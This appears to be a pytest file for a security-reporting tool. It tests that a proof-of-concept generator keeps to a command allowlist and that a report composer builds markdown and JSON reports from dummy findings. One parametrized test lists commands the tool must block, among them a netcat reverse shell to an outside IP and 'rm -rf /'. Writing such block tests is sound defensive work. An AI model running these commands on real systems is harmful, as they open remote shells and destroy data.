import pytest

from core.reporting.poc_generator import PoCGenerator, PoCSafetyError
from core.reporting.composer import ReportComposer


def test_poc_allowlist_only():
    g = PoCGenerator()
    finding = {
        "id": "f1",
        "type": "http_service",
        "host": "example.com",
        "port": 80,
        "scheme": "http",
        "path": "/",
        "risk": "info",
    }
    artifact = g.generate_for_finding(finding)
    assert artifact.safe is True
    assert artifact.commands
    for cmd in artifact.commands:
        exe = cmd.split(" ", 1)[0]
        assert exe in g._ALLOW_CMDS  # intentional: enforce allowlist


@pytest.mark.parametrize(
    "bad_cmd",
    [
        "bash -c whoami",
        "curl -X POST http://example.com/",
        "curl --data a=b http://example.com/",
        "nmap --script vuln example.com",
        "nc -e /bin/sh 1.2.3.4 4444",
        "python3 -c 'print(1)'",
        "rm -rf /",
    ],
)
def test_poc_blocks_dangerous_patterns(bad_cmd):
    g = PoCGenerator()
    with pytest.raises(PoCSafetyError):
        g._assert_safe_command(bad_cmd)


class DummyFindingStore:
    def list_findings(self):
        return [
            {"id": "f1", "type": "open_port", "host": "example.com", "port": 80, "risk": "info"},
            {"id": "f2", "type": "tls_issue", "host": "example.com", "port": 443, "risk": "medium"},
        ]


class DummyEvidenceLedger:
    def list_entries(self):
        return [
            {"id": "e1", "type": "screenshot", "timestamp": "2026-01-08T00:00:00Z", "summary": "Homepage headers"},
        ]


class DummyGraphAnalyzer:
    def critical_paths(self, max_paths: int = 5):
        return [{"nodes": ["internet", "example.com:80", "admin"], "risk": "medium", "pressure": 0.72}]
    
    def insights(self):
        return {"summary": "Target appears exposed via HTTP."}


def test_report_composer_markdown():
    c = ReportComposer(DummyFindingStore(), DummyEvidenceLedger(), DummyGraphAnalyzer())
    rep = c.generate(target="example.com", scope="authorized lab", report_format="markdown", include_attack_paths=True)
    assert rep.format == "markdown"
    assert "# Sentinel Report" in rep.content
    assert "## Findings" in rep.content
    assert "## Attack Path Analysis" in rep.content
    assert "internet -> example.com:80 -> admin" in rep.content


def test_report_composer_json():
    c = ReportComposer(DummyFindingStore(), DummyEvidenceLedger(), DummyGraphAnalyzer())
    rep = c.generate(target="example.com", report_format="json")
    assert rep.format == "json"
    assert '"report_id"' in rep.content
    assert '"findings"' in rep.content
